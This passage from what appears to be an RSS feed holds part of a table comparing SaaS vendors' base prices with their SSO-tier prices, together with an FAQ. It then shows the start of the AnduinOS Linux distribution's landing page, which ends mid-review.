<td>$20 per u/m</td>
<td>122%</td>
<td>


<a href="https://lucid.app/pricing/lucidchart">🔗</a>

Quote</td>
<td>2022-05-24</td>
</tr>

<tr>
<td><a href="https://www.mailjet.com/">Mailjet</a></td>
<td>$25 per month</td>
<td>$95 per month</td>
<td>280%</td>
<td>


<a href="https://documentation.mailjet.com/hc/en-us/articles/5216831817499-How-to-enable-SAML-SSO-with-Mailjet#h_01G01MC9HVB5DYRJKSERS9FHTK">🔗</a>


&amp;

<a href="https://www.mailjet.com/pricing/">🔗</a>

</td>
<td>2023-04-26</td>
</tr>

<tr>
<td><a href="https://mailtrap.io/">Mailtrap</a></td>
<td>$24.99 per month</td>
<td>$299.99 per month</td>
<td>1100%</td>
<td>


<a href="https://mailtrap.io/pricing/">🔗</a>

</td>
<td>2022-06-14</td>
</tr>

<tr>
<td><a href="https://www.mattermost.com/">Mattermost</a></td>
<td>$3.25 per u/m</td>
<td>$8.50 per u/m</td>
<td>162%</td>
<td>


<a href="https://mattermost.com/pricing/">🔗</a>

</td>
<td>2019-06-25</td>
</tr>

<tr>
<td><a href="https://www.metabase.com/">Metabase</a></td>
<td>$85 per month<sup id="fnref:metabase" role="doc-noteref"><a href="#fn:metabase" rel="footnote">12</a></sup></td>
<td>$500 per month</td>
<td>588%</td>
<td>


<a href="https://www.metabase.com/pricing/">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://miro.com/">Miro</a></td>
<td>$8 per u/m</td>
<td>$16 per u/m</td>
<td>100%</td>
<td>


<a href="https://miro.com/pricing/">🔗</a>

</td>
<td>2019-09-13</td>
</tr>

<tr>
<td><a href="https://mixpanel.com/">Mixpanel</a></td>
<td>$20 per month</td>
<td>$833 per month<sup id="fnref:mixpanel" role="doc-noteref"><a href="#fn:mixpanel" rel="footnote">13</a></sup></td>
<td>4065%</td>
<td>


<a href="https://mixpanel.com/pricing">🔗</a>

</td>
<td>2023-10-25</td>
</tr>

<tr>
<td><a href="https://monday.com/">Monday.com</a></td>
<td>$7 per u/m</td>
<td>$27 per u/m</td>
<td>286%</td>
<td>


<a href="https://monday.com/pricing/">🔗</a>

Quote</td>
<td>2020-05-26</td>
</tr>

<tr>
<td><a href="https://www.mural.co/">Mural</a></td>
<td>$10 per u/m</td>
<td>$18 per u/m</td>
<td>80%</td>
<td>


<a href="https://www.mural.co/pricing">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://www.netlify.com/">Netlify</a></td>
<td>$19 per u/m</td>
<td>$99 per u/m</td>
<td>421%</td>
<td>


<a href="https://www.netlify.com/pricing/">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://newrelic.com/products/infrastructure">New Relic Infrastructure</a></td>
<td>$0.60 - $7.20 per host-month<sup id="fnref:newrelic-price" role="doc-noteref"><a href="#fn:newrelic-price" rel="footnote">14</a></sup></td>
<td>$1.20 - $14.40 per host-month</td>
<td>100%</td>
<td>


<a href="https://newrelic.com/products/infrastructure/pricing">🔗</a>

</td>
<td>2018-10-18</td>
</tr>

<tr>
<td><a href="https://www.notion.so/">Notion</a></td>
<td>$8 per u/m</td>
<td>$15 per u/m</td>
<td>88%</td>
<td>


<a href="https://www.notion.so/pricing">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://www.opsgenie.com/">OpsGenie</a></td>
<td>$9 per u/m</td>
<td>$19 per u/m</td>
<td>111%</td>
<td>


<a href="https://www.opsgenie.com/pricing">🔗</a>

</td>
<td>2018-11-08</td>
</tr>

<tr>
<td><a href="https://www.optisigns.com/">OptiSigns</a></td>
<td>$10 per device/m</td>
<td>$15 per device/m</td>
<td>50%</td>
<td>


<a href="https://www.optisigns.com/pricing">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://pagertree.com/">PagerTree</a></td>
<td>$10 per u/m</td>
<td>$15 per u/m</td>
<td>50%</td>
<td>


<a href="https://pagertree.com/pricing/">🔗</a>

</td>
<td>2018-11-08</td>
</tr>

<tr>
<td><a href="https://www.pandadoc.com/">PandaDoc</a></td>
<td>$19 per u/m</td>
<td>$59 per u/m<sup id="fnref:pandadoc" role="doc-noteref"><a href="#fn:pandadoc" rel="footnote">15</a></sup></td>
<td>210%</td>
<td>


<a href="https://www.pandadoc.com/pricing/">🔗</a>

Quote</td>
<td>2019-10-16</td>
</tr>

<tr>
<td><a href="https://phrase.com/">Phrase</a></td>
<td>$29 per u/m</td>
<td>$369 per u/m</td>
<td>1172%</td>
<td>


<a href="https://phrase.com/pricing/">🔗</a>

</td>
<td>2023-10-22</td>
</tr>

<tr>
<td><a href="https://pitch.com/">Pitch</a></td>
<td>€10 per u/m</td>
<td>€30 per u/m</td>
<td>200%</td>
<td>


<a href="https://pitch.com/pricing">🔗</a>

</td>
<td>2024-02-05</td>
</tr>

<tr>
<td><a href="https://www.playvox.com/">Playvox</a></td>
<td>$15 per u/m</td>
<td>$30 per u/m</td>
<td>100%</td>
<td>


<a href="https://www.playvox.com/pricing">🔗</a>

</td>
<td>2020-06-09</td>
</tr>

<tr>
<td><a href="https://www.postman.com/">Postman</a></td>
<td>$14 per u/m</td>
<td>$49 per u/m</td>
<td>250%</td>
<td>


<a href="https://www.postman.com/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.projectmanager.com/">Project Manager</a></td>
<td>$11.50 per u/m</td>
<td>$45 per u/m</td>
<td>291%</td>
<td>


<a href="https://www.projectmanager.com/pricing">🔗</a>

Quote</td>
<td>2022-03-30</td>
</tr>

<tr>
<td><a href="https://quip.com/">Quip</a></td>
<td>$10 per u/m</td>
<td>$25 per u/m</td>
<td>150%</td>
<td>


<a href="https://quip.com/about/pricing">🔗</a>

</td>
<td>2019-02-15</td>
</tr>

<tr>
<td><a href="https://raygun.com/">Raygun</a></td>
<td>$79/mo<sup id="fnref:raygun" role="doc-noteref"><a href="#fn:raygun" rel="footnote">16</a></sup></td>
<td>$649/mo</td>
<td>721%</td>
<td>


<a href="https://raygun.com/platform/crash-reporting">🔗</a>

</td>
<td>2019-10-10</td>
</tr>

<tr>
<td><a href="https://readme.com/">ReadMe</a></td>
<td>$99 per project/mo</td>
<td>$3000 per project/mo</td>
<td>2930%</td>
<td>


<a href="https://readme.com/pricing">🔗</a>

</td>
<td>2024-02-25</td>
</tr>

<tr>
<td><a href="https://recruitee.com/">Recruitee</a></td>
<td>$199 per month</td>
<td>$274 per month</td>
<td>35%</td>
<td>


<a href="https://recruitee.com/pricing">🔗</a>

</td>
<td>2024-08-07</td>
</tr>

<tr>
<td><a href="https://www.retrium.com/">Retrium</a></td>
<td>$39 per month</td>
<td>$59 per month</td>
<td>51%</td>
<td>


<a href="https://www.retrium.com/pricing">🔗</a>

</td>
<td>2022-06-07</td>
</tr>

<tr>
<td><a href="https://www.riddle.com/">Riddle</a></td>
<td>$59 per month</td>
<td>$749 per month</td>
<td>1169%</td>
<td>


<a href="https://www.riddle.com/pricing">🔗</a>

</td>
<td>2023-07-24</td>
</tr>

<tr>
<td><a href="https://www.ringcentral.com/">RingCentral</a></td>
<td>$25 per u/m</td>
<td>$35 per u/m</td>
<td>40%</td>
<td>


<a href="https://www.ringcentral.com/office/plansandpricing.html">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://rocket.chat/">Rocket.Chat Cloud</a></td>
<td>$2 per u/m</td>
<td>$4 per u/m</td>
<td>100%</td>
<td>


<a href="https://rocket.chat/pricing#cloud">🔗</a>

</td>
<td>2018-10-22</td>
</tr>

<tr>
<td><a href="https://rollbar.com/developer/">Rollbar</a></td>
<td>$19 per month (25k events)</td>
<td>$39 per month (25K events)<sup id="fnref:rollbar" role="doc-noteref"><a href="#fn:rollbar" rel="footnote">17</a></sup></td>
<td>105%</td>
<td>


<a href="https://rollbar.com/pricing/">🔗</a>

</td>
<td>2024-11-08</td>
</tr>

<tr>
<td><a href="https://runway.team/">Runway</a></td>
<td>$499 per app/mo</td>
<td>$2,166.67 per app/mo</td>
<td>334%</td>
<td>


<a href="https://www.runway.team/pricing">🔗</a>

</td>
<td>2023-10-02</td>
</tr>

<tr>
<td><a href="https://www.sanity.io/">Sanity</a></td>
<td>$15 per u/m</td>
<td>$70.96 per u/m<sup id="fnref:sanity" role="doc-noteref"><a href="#fn:sanity" rel="footnote">18</a></sup></td>
<td>350%</td>
<td>


<a href="https://www.sanity.io/pricing">🔗</a>

</td>
<td>2024-01-23</td>
</tr>

<tr>
<td><a href="https://sendgrid.com/">Sendgrid</a></td>
<td>$20 per month</td>
<td>$90 per month</td>
<td>350%</td>
<td>


<a href="https://sendgrid.com/pricing/">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://sentry.io/">Sentry</a></td>
<td>$26 for 100K events<sup id="fnref:sentry" role="doc-noteref"><a href="#fn:sentry" rel="footnote">19</a></sup></td>
<td>$80 for 100K events</td>
<td>208%</td>
<td>


<a href="https://sentry.io/pricing/">🔗</a>

</td>
<td>2018-10-20</td>
</tr>

<tr>
<td><a href="https://slack.com/">Slack</a></td>
<td>$7.25 per u/m</td>
<td>$12.50 per u/m</td>
<td>72%</td>
<td>


<a href="https://slack.com/pricing">🔗</a>

</td>
<td>2023-06-29</td>
</tr>

<tr>
<td><a href="https://snyk.io/">Snyk</a></td>
<td>$23.96 per u/m</td>
<td>$39.98 per u/m</td>
<td>67%</td>
<td>


<a href="https://snyk.io/plans">🔗</a>

</td>
<td>2018-10-22</td>
</tr>

<tr>
<td><a href="https://stoplight.io/">Stoplight</a></td>
<td>$99 per u/m</td>
<td>$319 per u/m</td>
<td>222%</td>
<td>


<a href="https://stoplight.io/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://temporal.io/">Temporal Cloud</a></td>
<td>$200 per month<sup id="fnref:temporal" role="doc-noteref"><a href="#fn:temporal" rel="footnote">20</a></sup></td>
<td>$400+ per month<sup id="fnref:temporal:1" role="doc-noteref"><a href="#fn:temporal" rel="footnote">20</a></sup></td>
<td>100%+</td>
<td>


<a href="https://temporal.io/pricing">🔗</a>


&amp;

<a href="https://docs.temporal.io/cloud/pricing#sso-and-saml">🔗</a>

</td>
<td>2024-12-27</td>
</tr>

<tr>
<td><a href="https://www.gurock.com/testrail/">TestRail Cloud</a></td>
<td>$36 per u/m</td>
<td>$69 per u/m</td>
<td>92%</td>
<td>


<a href="https://www.gurock.com/testrail/pricing/cloud-enterprise">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://textexpander.com/">TextExpander</a></td>
<td>$8.83 per u/m</td>
<td>$13 per u/m<sup id="fnref:textexpander" role="doc-noteref"><a href="#fn:textexpander" rel="footnote">21</a></sup></td>
<td>47%</td>
<td>


<a href="https://textexpander.com/pricing">🔗</a>

Quote</td>
<td>2023-10-16</td>
</tr>

<tr>
<td><a href="https://trello.com/">Trello</a></td>
<td>$10 per u/m</td>
<td>$21 per u/m</td>
<td>110%</td>
<td>


<a href="https://trello.com/pricing">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="https://twilio.com/">Twilio</a></td>
<td>???</td>
<td>$3500 per month<sup id="fnref:twilio" role="doc-noteref"><a href="#fn:twilio" rel="footnote">22</a></sup></td>
<td>???%</td>
<td>


<a href="https://www.twilio.com/editions">🔗</a>

Quote</td>
<td>2024-10-08</td>
</tr>

<tr>
<td><a href="https://victorops.com/">VictorOps</a></td>
<td>$29 per u/m</td>
<td>$49 per u/m<sup id="fnref:victorops" role="doc-noteref"><a href="#fn:victorops" rel="footnote">23</a></sup></td>
<td>69%</td>
<td>


<a href="https://victorops.com/pricing">🔗</a>

</td>
<td>2018-10-17</td>
</tr>

<tr>
<td><a href="">Wix</a></td>
<td>$36 per month</td>
<td>$500 per month</td>
<td>1289%</td>
<td>


<a href="https://www.wix.com/plans">🔗</a>

Quote</td>
<td>2024-09-05</td>
</tr>

<tr>
<td><a href="https://www.workable.com/">Workable</a></td>
<td>$313 per month</td>
<td>$628 per month</td>
<td>100%</td>
<td>


<a href="https://www.workable.com/pricing">🔗</a>

</td>
<td>2024-07-03</td>
</tr>

<tr>
<td><a href="https://zeplin.io/">Zeplin</a></td>
<td>$10.75 per u/m</td>
<td>$21.50 per u/m<sup id="fnref:zeplin" role="doc-noteref"><a href="#fn:zeplin" rel="footnote">24</a></sup></td>
<td>100%</td>
<td>


<a href="https://sso.tax/Quote">🔗</a>

</td>
<td>2021-01-06</td>
</tr>

<tr>
<td><a href="https://zoom.us/">Zoom</a></td>
<td>$15.99 per u/m</td>
<td>$19.99 per u/m</td>
<td>25%</td>
<td>


<a href="https://zoom.us/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

</tbody>
</table>

<h2 id="the-other-list">The Other List</h2>
<p>Some vendors simply do not list their pricing for SSO because the pricing is negotiated with an account manager. These vendors get their own table as we assume they apply a significant premium for SSO.</p>

<table>
<thead>
<tr><th>Vendor</th><th>Base Pricing</th><th>SSO Pricing</th><th>% Increase</th><th>Source</th><th>Date Updated</th></tr>
</thead>
<tbody>

<tr>
<td><a href="https://anydesk.com/">AnyDesk</a></td>
<td>$29.90 per month</td>
<td>Call Us! ($79.90/month+)</td>
<td>167%+</td>
<td>


<a href="https://anydesk.com/en/pricing">🔗</a>

</td>
<td>2024-02-06</td>
</tr>

<tr>
<td><a href="https://www.atera.com/">Atera</a></td>
<td>$149 per user/mo</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.atera.com/it-department-pricing/">🔗</a>

</td>
<td>2024-08-29</td>
</tr>

<tr>
<td><a href="https://www.browserstack.com/">BrowserStack</a></td>
<td>$39 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.browserstack.com/pricing">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://www.bytebase.com/">Bytebase</a></td>
<td>$995 per year</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.bytebase.com/pricing/">🔗</a>

</td>
<td>2024-02-12</td>
</tr>

<tr>
<td><a href="https://codeium.com/">Codeium</a></td>
<td>$15 per u/m</td>
<td>Call us</td>
<td>???</td>
<td>


<a href="https://codeium.com/pricing">🔗</a>

</td>
<td>2024-04-23</td>
</tr>

<tr>
<td><a href="https://dagster.io/">Dagster</a></td>
<td>$100 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://dagster.io/pricing">🔗</a>

</td>
<td>2024-12-04</td>
</tr>

<tr>
<td><a href="https://gathercontent.com/">GatherContent</a></td>
<td>$299</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://gathercontent.com/pricing">🔗</a>

</td>
<td>2023-10-14</td>
</tr>

<tr>
<td><a href="https://www.getresponse.com/">GetResponse</a></td>
<td>$48 per month</td>
<td>Call Us! ($98/month+)</td>
<td>104%+</td>
<td>


<a href="https://www.getresponse.com/pricing#max">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://hex.tech/">Hex</a></td>
<td>$36 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://hex.tech/pricing/">🔗</a>

</td>
<td>2023-08-09</td>
</tr>

<tr>
<td><a href="https://www.hootsuite.com/">HootSuite</a></td>
<td>$249/mo</td>
<td>Call Us! (over $249/mo)<sup id="fnref:hootsuite" role="doc-noteref"><a href="#fn:hootsuite" rel="footnote">25</a></sup></td>
<td></td>
<td>


<a href="https://www.hootsuite.com/plans">🔗</a>

</td>
<td>2024-02-09</td>
</tr>

<tr>
<td><a href="https://jam.dev/">Jam</a></td>
<td>$8 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://jam.dev/pricing">🔗</a>

</td>
<td>2024-05-11</td>
</tr>

<tr>
<td><a href="">Kubecost</a></td>
<td>$449/mo</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.kubecost.com/pricing">🔗</a>

</td>
<td>2022-06-15</td>
</tr>

<tr>
<td><a href="https://linearb.io/">LinearB</a></td>
<td>$49 per month<sup id="fnref:linearb" role="doc-noteref"><a href="#fn:linearb" rel="footnote">26</a></sup></td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://linearb.io/pricing">🔗</a>

</td>
<td>2024-10-16</td>
</tr>

<tr>
<td><a href="https://multi.app/">Multi</a></td>
<td>$30 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://multi.app/pricing">🔗</a>

</td>
<td>2024-02-27</td>
</tr>

<tr>
<td><a href="https://nationbuilder.com/">NationBuilder</a></td>
<td>$29 per month</td>
<td>Call Us! (over $199/month)</td>
<td>586%++<sup id="fnref:nationbuilder" role="doc-noteref"><a href="#fn:nationbuilder" rel="footnote">27</a></sup></td>
<td>


<a href="https://nationbuilder.com/pricing">🔗</a>

</td>
<td>2019-02-09</td>
</tr>

<tr>
<td><a href="https://onesignal.com/">OneSignal</a></td>
<td>$9 per month</td>
<td>Call Us! ($8000+ minimum annual commitment)</td>
<td>7307%</td>
<td>


<a href="https://onesignal.com/pricing">🔗</a>

Quote</td>
<td>2024-08-13</td>
</tr>

<tr>
<td><a href="https://www.pluralsight.com/">Pluralsight</a></td>
<td>$579 per u/y</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.pluralsight.com/pricing/skills">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://prismic.io/">Prismic</a></td>
<td>$180 per repository/mo<sup id="fnref:prismic" role="doc-noteref"><a href="#fn:prismic" rel="footnote">28</a></sup></td>
<td>Call us</td>
<td>???</td>
<td>


<a href="https://prismic.io/pricing">🔗</a>

</td>
<td>2024-07-26</td>
</tr>

<tr>
<td><a href="https://www.process.st/">Process.st</a></td>
<td>$1500 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.process.st/pricing/">🔗</a>

</td>
<td>2024-06-10</td>
</tr>

<tr>
<td><a href="https://projectdiscovery.io/">Project Discovery</a></td>
<td>$100 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://projectdiscovery.io/pricing">🔗</a>

</td>
<td>2024-06-28</td>
</tr>

<tr>
<td><a href="https://resend.com/">Resend</a></td>
<td>$20 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://resend.com/pricing">🔗</a>

</td>
<td>2023-11-10</td>
</tr>

<tr>
<td><a href="https://retool.com/">Retool</a></td>
<td>$10 per u/m</td>
<td>Call Us!</td>
<td>400%+</td>
<td>


<a href="https://retool.com/pricing">🔗</a>

</td>
<td>2024-04-05</td>
</tr>

<tr>
<td><a href="https://saucelabs.com/">Sauce Labs</a></td>
<td>$49 per month for 1 test</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://saucelabs.com/pricing">🔗</a>

</td>
<td>2024-07-22</td>
</tr>

<tr>
<td><a href="https://screencloud.com/">ScreenCloud</a></td>
<td>$24 per screen/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://screencloud.com/pricing">🔗</a>

</td>
<td>2024-03-15</td>
</tr>

<tr>
<td><a href="https://www.sender.net/">Sender</a></td>
<td>$8.33 per month</td>
<td>Call Us! ($29+)</td>
<td>250%+</td>
<td>


<a href="https://www.sender.net/pricing/">🔗</a>

</td>
<td>2023-10-15</td>
</tr>

<tr>
<td><a href="https://smartsheet.com/">SmartSheet</a></td>
<td>$25 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.smartsheet.com/pricing">🔗</a>

</td>
<td>2018-10-22</td>
</tr>

<tr>
<td><a href="https://www.streamyard.com/">StreamYard</a></td>
<td>$99/mo</td>
<td>Call Us! (over $299/mo)</td>
<td>67%+<sup id="fnref:streamyard" role="doc-noteref"><a href="#fn:streamyard" rel="footnote">29</a></sup></td>
<td>


<a href="https://streamyard.com/plan?planType=businesses">🔗</a>

</td>
<td>2024-01-14</td>
</tr>

<tr>
<td><a href="https://www.surveymonkey.com/">SurveyMonkey</a></td>
<td>$25 per u/m</td>
<td>Call Us! (over $75 per u/m)</td>
<td>200%++</td>
<td>


<a href="https://www.surveymonkey.com/pricing/details/">🔗</a>

</td>
<td>2021-09-06</td>
</tr>

<tr>
<td><a href="https://www.teamviewer.com/">TeamViewer</a></td>
<td>$112.9 per month</td>
<td>Call Us! ($229.9/month+)</td>
<td>103%+</td>
<td>


<a href="https://service.teamviewer.com/en-us/overview/a">🔗</a>

</td>
<td>2024-02-06</td>
</tr>

<tr>
<td><a href="https://www.teamwork.com/">Teamwork.com</a></td>
<td>$13.99 per u/m</td>
<td>Call us</td>
<td>???</td>
<td>


<a href="https://support.teamwork.com/projects/security/teamwork-advanced-security-add-on">🔗</a>

</td>
<td>2024-07-26</td>
</tr>

<tr>
<td><a href="https://typeform.com/">Typeform</a></td>
<td>$50 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.typeform.com/pricing/">🔗</a>

</td>
<td>2024-06-20</td>
</tr>

<tr>
<td><a href="https://vercel.com/">Vercel</a></td>
<td>$20 per u/m</td>
<td>Call Us!<sup id="fnref:vercel" role="doc-noteref"><a href="#fn:vercel" rel="footnote">30</a></sup></td>
<td>1150%</td>
<td>


<a href="https://vercel.com/pricing">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://webflow.com/">Webflow</a></td>
<td>$12 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://webflow.com/pricing">🔗</a>

</td>
<td>2022-07-07</td>
</tr>

<tr>
<td><a href="https://wandb.ai/">Weights and Biases</a></td>
<td>$50 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://wandb.ai/site/pricing">🔗</a>

</td>
<td>2023-07-12</td>
</tr>

<tr>
<td><a href="https://www.zight.com/">Zight</a></td>
<td>$8 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://zight.com/plans/">🔗</a>

</td>
<td>2023-10-17</td>
</tr>

<tr>
<td><a href="https://www.getdbt.com/">dbt Cloud</a></td>
<td>$100 per u/m</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://www.getdbt.com/pricing">🔗</a>

</td>
<td>2024-12-18</td>
</tr>

<tr>
<td><a href="https://n8n.io/">n8n</a></td>
<td>$24 per month</td>
<td>Call Us!</td>
<td>???</td>
<td>


<a href="https://n8n.io/pricing/">🔗</a>

</td>
<td>2024-11-01</td>
</tr>

</tbody>
</table>

<h2 id="faqs">FAQs</h2>

<details>
  <summary>
    <p>This doesn’t scale linearly for number of seats!</p>
  </summary>
  <p>Correct. Since we don’t know who’s reading the page, it’s easiest to just assume a team with no volume discount.</p>
</details>

<details>
  <summary>
    <p>How is base pricing determined?</p>
  </summary>
  <p>We disregard free tier pricing, as we can assume these aren’t intended for long term business customer use. We also disregard “single person” pricing, under the assumption that we’re looking on behalf of a team of 5, 10, or more people.</p>
</details>

<details>
  <summary>
    <p>What does “Quote” mean in the Source column?</p>
  </summary>
  <p>If a vendor doesn’t list pricing but a user has submitted pricing based on a quote, it can be included here. If a vendor feels that their actual pricing is inaccurately reflected by this quote, feel free to let me know and I’ll update the page.</p>
</details>

<details>
  <summary>
    <p>I’m a vendor and this data is wrong!</p>
  </summary>
  <p>Please feel free to submit a PR to this page, or reach out at sso @ myGitHubUsername dotcom. I only want this data to be accurate.</p>
</details>

<details>
  <summary>
    <p>I’m a vendor and this doesn’t reflect the value-add of our Enterprise tier!</p>
  </summary>
  <p>That’s the point. Decouple your security features from your value-added services. They should be priced separately.</p>
</details>

<details>
  <summary>
    <p>But it costs money to provide SAML support, so we can’t offer it for free!</p>
  </summary>
  <p>While I’d like people to really consider it a <em>bare minimum</em> feature for business SaaS, I’m OK with it costing a little extra to cover maintenance costs. If your SSO support is a 10% price hike, you’re not on this list. But these percentage increases are not maintenance costs, they’re revenue generation because you know your customers have no good options.</p>
</details>






      
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AnduinOS (129 pts)]]></title>
            <link>https://www.anduinos.com/</link>
            <guid>44954823</guid>
            <pubDate>Tue, 19 Aug 2025 18:42:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anduinos.com/">https://www.anduinos.com/</a>, See on <a href="https://news.ycombinator.com/item?id=44954823">Hacker News</a></p>
<div id="readability-page-1" class="page">




<!-- Ad Banner -->



<nav>
    
</nav>


<div>
            <div>
                <p><span>Open Source</span>
                <span>Free</span>
                <span>GPL-v3 License</span></p><h2 id="main-slogan">
                    <span>AnduinOS</span> is Ubuntu's package base + <span>Flatpak</span> app experience
                </h2>
                <p>AnduinOS is a custom Ubuntu-based Linux distribution that offers a familiar and easy-to-use experience for anyone moving to Linux.</p>
                <p><span>v1.3.4</span>
                </p>
                
                
            </div>
            <div>
                <p><img src="https://www.anduinos.com/sc.webp" alt="AnduinOS Main screenshot">
                </p>
            </div>
        </div>

<div>
        <div>
            <p><span>Reasons</span></p><h2>Why choose AnduinOS?</h2>
            <p>Smaller image, friendly interface, unbeatable performance, safe and secure.
            </p>
        </div>
        <div>
            <div>
                        <h4>Ready to use</h4>
                        <p>The ISO is just 2.0GB in size. Similar to Ubuntu, it is simple to install and can meet your daily needs without additional configuration or complicated operations.</p>
                    </div>
            <div>
                        <h4>Friendly interface</h4>
                        <p>The GNOME-based desktop environment have beautiful interfaces and human-computer interactions that fit user habits, allowing you to quickly get started with AnduinOS without too much learning cost.</p>
                    </div>
            <div>
                        <h4>Root and privacy</h4>
                        <p>Privacy is no longer optional. It's essential. AnduinOS is designed to gather nothing from you. We don't track you. We don't profile you. We don't target you. You remain anonymous to the system.</p>
                    </div>
            <div>
                        <h4>Ecological perfection</h4>
                        <p>AnduinOS is based on Ubuntu's package base. It's compatible with most of the apt packages from Ubuntu. It's a perfect combination of experience and ecology.</p>
                    </div>
            <div>
                        <h4>Open Source</h4>
                        <p>AnduinOS is an open-source project. Following the GPL-v3 license, you can view the source code, modify it, and redistribute it. It's free and will always be free.</p>
                    </div>
            <div>
                        <h4>Containerized</h4>
                        <p>Graphical applications are installed via Flatpak, and keep themselves separate from the base system (Since 1.3). They also allow for fine-grained control over their permissions.</p>
                    </div>
        </div>
    </div>

<div id="download-links">
                <div>
                    <p><span>Versions</span></p><h2>Choose your AnduinOS version</h2>
                    <p>AnduinOS is available in <a href="https://docs.anduinos.com/VERSIONS.html">two version branches</a>: LTS and Standard.
                        The LTS version is recommended for users need a stable long-term support, while the Standard version is recommended for users with newer devices and want to explore the latest features.
                    </p>
                </div>
                <div>
                        <div>
                                    

                                    <h6>Includes:</h6>
                                    <ul>
                                        <li>Support till Apr 2029</li>
                                        <li>Gnome 46</li>
                                        <li>Ubuntu 24.04 packages</li>
                                        <li>Linux kernel 6.11</li>
                                        <li>Released on 2025.01.06</li>
                                        <li>
                                            Latest version 1.1.7
                                        </li>
                                            <li>Recommended for users need a stable long-term version and on older hardware.</li>
                                    </ul>

                                    
                                </div>
                        <div>
                                    <div>
                                        <h5>Plucky Puffin</h5>
                                        <p><span>
                                            1.3
                                        </span><br>
                                        <span>Standard</span>
                                    </p></div>

                                    <h6>Includes:</h6>
                                    <ul>
                                        <li>Support till Jan 2026</li>
                                        <li>Gnome 48</li>
                                        <li>Ubuntu 25.04 packages</li>
                                        <li>Linux kernel 6.14</li>
                                        <li>Released on 2025.05.01</li>
                                        <li>
                                            Latest version 1.3.4
                                        </li>
                                            <li>Using flatpak for graphical applications.</li>
                                            <li>
                                                <span>
                                                    Recommended
                                                </span>
                                            </li>
                                    </ul>

                                    
                                </div>
                </div>
            </div>

<div>
                <div>
                            <p><span>Usage</span></p><h2>With AnduinOS, you can do more</h2>
                            <p>
                                Everything you do on Ubuntu, you can do it on AnduinOS. You can use it as a daily operating system, a development environment, a server, or a learning tool. It's up to you.
                            </p>
                        </div>

                <div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/watch_comp.webp" loading="lazy" alt="Watching Youtube Videos on AnduinOS"></p><h4>Browsing</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/steam_comp.webp" loading="lazy" alt="Steam Playing Games on AnduinOS"></p><h4>Gaming <sup><small>With Steam</small></sup></h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/build_comp.webp" loading="lazy" alt="Writing Code on AnduinOS"></p><h4>Build</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/office_comp.webp" loading="lazy" alt="Working on mail and chat on AnduinOS"></p><h4>Work</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/serve_comp.webp" loading="lazy" alt="Hosting a server on AnduinOS"></p><h4>Serve</h4>
                    </div>
                    <div>
                        <p><img gallery="" src="https://www.anduinos.com/scs/blender_comp.webp" loading="lazy" alt="Editing blender 3D model on AnduinOS"></p><h4>Editing</h4>
                    </div>
                </div>
            </div>

<p><span onclick="igl_hide()">×</span>
    <img id="iglmodal-img" alt="Image preview" src="#">
</p>

<div>
            <p><span>Reviews</span></p><h2>What users are saying</h2>
            <p>Here's what some of our 2000+ users have to say about working with AnduinOS.
            </p>
        </div>

<div>
            <div>
                        <h4>
                            <a href="https://www.windowscentral.com/software-apps/a-microsoft-engineer-made-a-linux-distro-thats-like-a-comfort-blanket-to-ex-windows-users" target="_blank">Windows Central</a>
                        </h4>
                        <p>...it's pretty spectacular. It's also quite possibly one of the friendliest Linux distros I've tried when it comes to folks who may well be moving over from Windows. Built by one person, it's pretty astonishing how good it is.</p>
                    </div>
            <div>
                        <h4>
